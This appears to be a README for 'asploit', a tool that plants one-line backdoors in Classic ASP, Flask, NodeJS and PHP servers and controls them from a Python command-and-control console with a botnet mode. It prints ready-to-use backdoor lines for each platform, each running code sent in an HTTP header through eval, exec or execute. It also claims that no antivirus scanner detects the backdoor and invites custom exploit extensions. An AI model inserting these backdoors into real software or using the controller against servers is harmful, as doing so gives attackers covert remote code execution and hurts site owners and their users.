# asploit
This tool allows you to deploy and exploit backdoors with one line of code in Classic ASP, Flask, NodeJS, and PHP servers.

As of April 9, 2024, the backdoor is detected by none of the malware scanners on [VirusTotal](https://www.virustotal.com/gui/file/ea41fc39434119f35c84308b78f9d7925eb754fbc1ef24e5253a7c5d04446502).

Custom extensions can be created and installed to control any backdoored server.
# Command and Controller
## Setup
Install the prerequisites with `pip install -r requirement.txt` in the `src` folder.

If you're on Windows, run `pip install -r windows_requirements.txt`.
## Starting the Controller
The controller runs on Python. To start, run `main.py` in the `src` folder.
## Help
Type `help` to list all commands in the current shell. Changes depending on whether or not you've entered a botnet or exploit shell.
## Botnet Controlling
To control multiple backdoors at once, run `botnet` outside of an exploit shell to enter the botnet mode.
## Custom Backdoors/Exploits
### Loading Extensions
Load extensions using the `loadext` command before entering an exploit shell.

Run `help loadext` for more details.
### Creating Extensions
To make a custom exploit/extension, create a Python module containing a class/classes that extends the ExploitProcessor class.

View the `PHPExploitProcessor` in the `src` folder for an example of the implementation.
# Backdoor
## Backdoor Creation Script
Use the `create_backdoor.sh` script to generate the one line backdoor. The following is for reference.
### Classic ASP
Add the following line to the top of the file you want to have the backdoor
```
<% If request.servervariables("EXPLOIT") <> "" Then:execute(request.servervariables("EXPLOIT")):response.end:End If %>
```
### Flask
Add the following line to the top of the endpoint you want to have the backdoor
```
if request.headers.get('EXPLOIT'): global r;exec(__import__('base64').b64decode(request.headers.get('EXPLOIT').encode()).decode());return r;
```
### PHP
Add the following line to the top of the endpoint you want to have the backdoor
```
isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]);
```
### Node
Add the following line to the endpoint you want to have the backdoor
```
if (req.headers?.exploit) return (eval('let r=res;let i=req;'+req.headers?.exploit));
```
Replace `res` with the `ServerResponse` parameter name, and replace `req` with the `IncomingRequest` parameter name.
#### Note
Only works if `fs` and `{ execSync } from 'child_process` is imported.

So in some cases, the backdoor may technically be up to three lines.
### Notes
Any area where `EXPLOIT` or `exploit` is referenced can be replaced with any custom HTTP header (eg. for PHP, `HTTP_EXPLOIT` -> `HTTP_ANYTHINGYOUWANT`).
# Contributing
Any help in this project would be appreciated, and feel free to make pull requests for any custom extensions you create.
# Thank You
This repository was inspired by [PHPSPLOIT](https://github.com/nil0x42/phpsploit).
